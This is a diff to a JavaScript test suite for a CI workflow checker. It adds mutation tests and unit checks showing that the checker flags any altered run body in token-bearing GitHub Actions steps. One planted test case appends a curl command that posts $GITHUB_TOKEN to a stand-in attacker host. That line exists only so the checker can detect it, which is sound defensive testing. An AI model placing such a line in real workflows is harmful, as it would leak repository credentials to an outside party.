@@ -16,7 +16,7 @@ import {
 } from '../harness/run.mjs';
 import { validateMutants, applyMutant, coverageGaps, runMutants, loadMutants, REQUIRED } from '../harness/mutate.mjs';
 import { parseSchedule, checkSchedule, activeWorkflowText } from '../../../ops/schedule.mjs';
-import { writeJobProblems, orderProblems, buildProblems, dependencyProblems, importSpecifiers, SYNC } from '../../../ops/write-job.mjs';
+import { writeJobProblems, orderProblems, buildProblems, dependencyProblems, importSpecifiers, runBodyProblems, SYNC } from '../../../ops/write-job.mjs';
 import { listArtifact, takeBuildOutput, PATHS } from '../../../ops/take-build-output.mjs';
 import { parseYaml } from '../yaml.mjs';
 import { staleness, staleLine } from '../../../ops/stale-run.mjs';
@@ -558,6 +558,13 @@ const rest = [
         ['review 3d O6-3: download-artifact on a tag', 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c', 'actions/download-artifact@v8', /uses actions\/download-artifact@v8, not pinned/],
         // Ours, O6-3: a short SHA in build.
         ['build setup-bun on a short SHA', 'oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6', 'oven-sh/setup-bun@0c5077e', /job build step \d+ .*uses oven-sh\/setup-bun@0c5077e, not pinned/],
+        // Review 3e (GPT-6-Luna): the push step is allowed the token by its role, so its content is pinned too.
+        ['review 3e: exfiltration appended to the token-bearing push step', '        push origin "HEAD:${GITHUB_REF_NAME}"\n', '        push origin "HEAD:${GITHUB_REF_NAME}"\n          curl --data-binary "$GITHUB_TOKEN" https://attacker.invalid/collect\n', /step \d+ \(Push\): run body differs from the reviewed text at line 6: reviewed "<end>", found "curl --data-binary \\"\$GITHUB_TOKEN\\" https:\/\/attacker\.invalid\/collect"/],
+        ['a harmless-looking extra echo on the commit step', '          echo "committed=true" >> "$GITHUB_OUTPUT"\n', '          echo "committed=true" >> "$GITHUB_OUTPUT"\n          echo done\n', /\(Apply the generated files and commit them\): run body differs from the reviewed text at line 17: reviewed "<end>", found "echo done"/],
+        ['the sync command given an extra flag', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json --dry-run\n', /\(Sync the dashboard issue from the committed watch\/live\.json\): run body differs from the reviewed text at line 1/],
+        ['a new publish step', '      - name: Push\n', '      - name: Report\n        run: git log -1 --stat\n\n      - name: Push\n', /step \d+ \(Report\): runs text under a name PUBLISH_RUNS does not hold/],
+        ['a changed comment line in the push step', '# .git/config. A plain push', '# .git/config. ${{ github.token }} A plain push', /\(Push\): run body differs from the reviewed text at line 2/],
+        ['the push step renamed', '      - name: Push\n', '      - name: Push it\n', /has no step named "Push" running the reviewed body/],
       ];
       for (const [name, find, replace, want] of plants) {
         let p;
@@ -580,6 +587,13 @@ const rest = [
         try { p = probs(plantWorkflow(text, find, replace)); } catch (e) { c.expect(false, `${name}: ${e.message}`); continue; }
         c.expect(p.length === 0, `${name}: expected no finding, the job boundary makes it harmless (got ${p.join(' | ')})`);
       }
+      const rv = { A: ['x', 'y'] };
+      c.expect(runBodyProblems([{ name: 'A', run: 'x\ny\n\n' }], 'p', rv).length === 0, 'trailing newlines are not the only normalisation allowed');
+      c.expect(runBodyProblems([{ name: 'A', run: 'x\ny ' }], 'p', rv).some((m) => /line 2: reviewed "y", found "y "/.test(m)), 'a trailing space passes the comparison');
+      c.expect(runBodyProblems([{ name: 'A', run: 'x\n\ny' }], 'p', rv).some((m) => /line 2/.test(m)), 'an inserted blank line passes the comparison');
+      c.expect(runBodyProblems([{ name: 'A', run: 'x\ny' }, { name: 'A', run: 'x\ny' }], 'p', rv).some((m) => /runs the reviewed step "A" 2 times/.test(m)), 'a repeated reviewed step passes');
+      c.expect(runBodyProblems([], 'p', rv).some((m) => /has no step named "A"/.test(m)), 'a missing reviewed step passes');
+      c.expect(runBodyProblems([{ name: 'toString', run: 'x' }], 'p', rv).some((m) => /does not hold/.test(m)), 'an inherited property name counts as reviewed');
       const wf = parseYaml(text);
       c.expect(Object.values(wf.jobs.build.permissions).every((v) => v === 'read' || v === 'none'),
         'the inert plants rest on build being read-only, and it is not');
